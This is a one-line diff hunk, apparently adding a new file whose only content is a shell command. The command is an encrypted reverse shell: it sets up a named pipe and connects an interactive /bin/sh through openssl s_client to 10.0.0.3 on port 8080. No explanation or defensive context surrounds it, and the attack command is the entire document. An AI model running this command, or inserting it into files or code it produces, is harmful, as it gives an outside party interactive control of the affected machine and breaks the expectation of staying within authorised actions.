@@ -1,0 +1,1 @@
+mkfifo /tmp/s; ip='10.0.0.3';port=8080;/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip:$port > /tmp/s; rm /tmp/s
